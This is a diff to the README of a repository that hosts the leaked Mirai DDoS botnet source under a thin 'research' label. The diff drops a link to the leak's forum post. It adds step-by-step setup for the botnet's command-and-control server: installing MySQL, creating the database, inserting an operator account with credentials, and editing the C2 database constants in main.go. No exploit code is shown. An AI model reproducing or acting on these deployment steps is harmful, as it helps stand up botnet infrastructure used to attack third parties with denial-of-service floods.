@@ -3,8 +3,6 @@ Mirai DDoS Attack Source Code for Research Development Purposes
 
 Uploaded for research purposes and so we can develop secure env and such.
 
-See "ForumPost.txt" or [ForumPost.md](ForumPost.md) for the post in which it
-leaks, if you want to know how it is all set up and the likes.
 
 ## Requirements
 * gcc
@@ -26,6 +24,28 @@ This is real automation of hacking and attack.
 Continue study to secure whatever.
 
 ## Architecture
+
+# Configuring CNC
+
+    apt-get install mysql-server mysql-client
+
+CNC requires database to work. When you install database, go into it and run
+following sql (scripts/db.sql)
+
+This will create database for you. To add your user,
+
+    INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');
+
+Now, go into file [`./mirai/cnc/main.go`](/cnc/main.go)
+
+Edit these values
+
+    const DatabaseAddr string   = "127.0.0.1"
+    const DatabaseUser string   = "root"
+    const DatabasePass string   = "password"
+    const DatabaseTable string  = "mirai"
+
+To the information for the mysql server you just installed
 
 //Install Go
 
